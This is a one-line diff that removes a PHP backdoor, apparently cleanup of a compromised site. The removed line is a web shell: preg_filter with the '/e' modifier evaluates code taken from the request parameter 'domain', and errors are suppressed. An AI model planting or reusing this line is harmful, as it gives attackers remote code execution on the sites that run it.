@@ -1,1 +1,0 @@
-<?php @preg_filter('|.*|e', $_REQUEST['domain'], ''); ?>
